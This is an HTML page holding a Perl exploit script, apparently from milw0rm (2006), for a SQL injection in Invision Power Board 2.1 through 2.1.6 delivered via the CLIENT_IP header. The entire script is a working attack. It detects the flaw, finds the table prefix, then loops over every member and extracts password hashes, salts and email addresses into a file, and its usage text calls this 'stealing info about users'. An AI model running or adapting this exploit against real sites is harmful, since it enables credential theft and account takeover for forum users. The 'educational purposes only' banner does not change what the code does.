<html><head><title>Invision Power Board 2.1 <= 2.1.6 Remote SQL Injection Exploit (2)</title></head><pre>#!/usr/bin/perl
use LWP::UserAgent; 
$ua = LWP::UserAgent-&gt;new; 
&amp;header();
if (@ARGV &lt; 2) {&amp;info(); exit();}
$server = $ARGV[0];
$dir = $ARGV[1];
print &quot;[+] SERVER {$server}\r\n&quot;;
print &quot;[+] DIR {$dir}\r\n&quot;;
#Step 1, detecting vulnerability
print &quot;[1] Testing forum vulnerability...&quot;;
$q = &quot;UNION SELECT 'VULN',1,1,1/*&quot;;
query($q,$server,$dir);
if($rep =~/VULN/){ print &quot;forum vulnerable\r\n&quot;; }
else 
    {
     print &quot;forum unvulnerable\r\n&quot;;
	 &amp;footer();
     exit();
    }
#Step 2, detecting prefix
print &quot;[2] Searching prefix...&quot;;
$q = &quot;&quot;;
query($q,$server,$dir);
$prefix = $rep;
print $prefix.&quot;\r\n&quot;;
#Step 3, make query
print &quot;[3] Performing query; it may take several minutes, plz, wait...\r\n&quot;;
$q1 = &quot;UNION SELECT MAX(converge_id),1,1,1 FROM &quot;.$prefix.&quot;members_converge/*&quot;;
query($q1,$server,$dir);
$kol = $rep;
open(RES,&quot;&gt;&quot;.$server.&quot;_result.txt&quot;);
for($id = 1; $id &lt;= $kol; $id++)
    {
	 $own_query = &quot;UNION SELECT converge_pass_hash,1,1,1 FROM &quot;.$prefix.&quot;members_converge WHERE converge_id=&quot;.$id.&quot;/*&quot;;
     query($own_query,$server,$dir);
     if($rep=~/[0-9a-f]{32}/i) 
	    {
	     $hash = $rep;
		 $own_query = &quot;UNION SELECT converge_pass_salt,1,1,1 FROM &quot;.$prefix.&quot;members_converge WHERE converge_id=&quot;.$id.&quot;/*&quot;;
         query($own_query,$server,$dir);
         if(length($rep)==5) 
		    {
			 $salt = $rep;
			 $own_query = &quot;UNION SELECT converge_email,1,1,1 FROM &quot;.$prefix.&quot;members_converge WHERE converge_id=&quot;.$id.&quot;/*&quot;;
             query($own_query,$server,$dir);
			 if(length($rep)&gt;0)
			    {
				 $email = $rep;
				 print RES $id.&quot;:&quot;.$hash.&quot;:&quot;.$salt.&quot;::&quot;.$email.&quot;\n&quot;;
			    }
			}		 
		}
    }
close(RES);
print &quot;[!] Query was successfully perfomed. Results are in txt files\r\n&quot;;
&amp;footer();
$ex = &lt;STDIN&gt;;
sub footer()
    {
     print &quot;[G] Greets: 1dt.w0lf (rst/ghc)\r\n&quot;;
     print &quot;[L] Visit: secbun.info | damagelab.org | rst.void.ru\r\n&quot;;
    }
sub header()
{
print q(
----------------------------------------------------------
* Invision Power Board 2.1.* Remote SQL Injecton Exploit *
*       Based on r57-Advisory#41 by 1dt.w0lf (rst/ghc)   *
*                Coded by w4g.not null                   *
*              FOR EDUCATIONAL PURPOSES *ONLY*           *
----------------------------------------------------------
);
}
sub info()
{
 print q(
[i] Usage: perl w4gipb216.pl [server] [/dir/]
     where
	   |- server - server, where IPB installed without http://
	   |- /dir/ - dir, where IPB installed or / for no dir
	 e.g perl w4gipb216.pl someserver.com /forum/
[i] Stealing info about users (format id:pass:salt::email)	  
[!] Need MySQL &gt; 4.0 
 );
}
sub query()
    {
     my($q,$server,$dir) = @_;
     $res = $ua-&gt;get(&quot;http://&quot;.$server.$dir.&quot;index.php?s=w00t&quot;,'USER_AGENT'=&gt;'','CLIENT_IP'=&gt;&quot;' &quot;.$q); 
     if($res-&gt;is_success)
        {
         $rep = '';
         if($res-&gt;as_string =~ /ipb_var_s(\s*)=(\s*)&quot;(.*)&quot;/) { $rep = $3; }
         else
   		    {
             if($res-&gt;as_string =~ /FROM (.*)sessions/) { $rep = $1; }
            }
        }
     return $rep;
    }

# milw0rm.com [2006-07-18]</pre></html>